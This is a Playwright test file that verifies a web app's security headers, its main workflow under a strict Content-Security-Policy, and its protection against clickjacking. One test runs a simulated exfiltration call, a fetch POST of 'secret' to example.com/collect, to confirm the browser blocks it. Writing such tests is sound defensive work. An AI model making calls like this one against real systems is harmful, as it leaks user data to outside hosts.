import { expect, test } from "@playwright/test";

// Runs under the same security headers as production (scripts/serve-static.mjs applies vercel.json).
test("security headers are sent and the full product works under the strict Content-Security-Policy", async ({ page }) => {
  const violations: string[] = [];
  page.on("console", (m) => {
    const t = m.text();
    if (/Content Security Policy|Refused to/i.test(t)) violations.push(t);
  });
  const res = await page.goto("/");
  const h = res!.headers();
  expect(h["content-security-policy"]).toContain("connect-src 'self'");
  expect(h["content-security-policy"]).toContain("frame-ancestors 'none'");
  expect(h["x-content-type-options"]).toBe("nosniff");
  expect(h["x-frame-options"]).toBe("DENY");
  expect(h["referrer-policy"]).toBe("no-referrer");

  // the live Overview illustration (fetch + Web Worker) must work under the policy
  await expect(page.getByText("Three descriptions, one identity")).toBeVisible({ timeout: 20_000 });
  // the whole loop: run, review with evidence (JSON download uses a blob URL), governance tamper test
  await page.goto("/sample/");
  await page.getByRole("button", { name: /run sama-nmc/i }).click();
  await page.waitForURL(/\/materials/, { timeout: 60_000 });
  await page.goto("/review/?d=DEMO_A%3A10004108~DEMO_B%3AM-20427&evidence=1");
  await expect(page.getByText(/R-01/).first()).toBeVisible();
  const download = page.waitForEvent("download");
  await page.getByRole("button", { name: /download certificate/i }).click();
  expect((await download).suggestedFilename()).toMatch(/\.json$/);
  await page.goto("/governance/");
  await expect(page.locator("main")).toBeVisible();
  expect(violations, violations.join("\n")).toEqual([]);
});

test("the app cannot send data to another origin (blocked by the browser, not just by our code)", async ({ page }) => {
  await page.goto("/");
  const outcome = await page.evaluate(async () => {
    try {
      await fetch("https://example.com/collect", { method: "POST", body: "secret" });
      return "sent";
    } catch {
      return "blocked";
    }
  });
  expect(outcome).toBe("blocked");
});

test("the site refuses to be framed by another page (clickjacking)", async ({ page }) => {
  const res = await page.goto("/");
  expect(res!.headers()["content-security-policy"]).toContain("frame-ancestors 'none'");
});
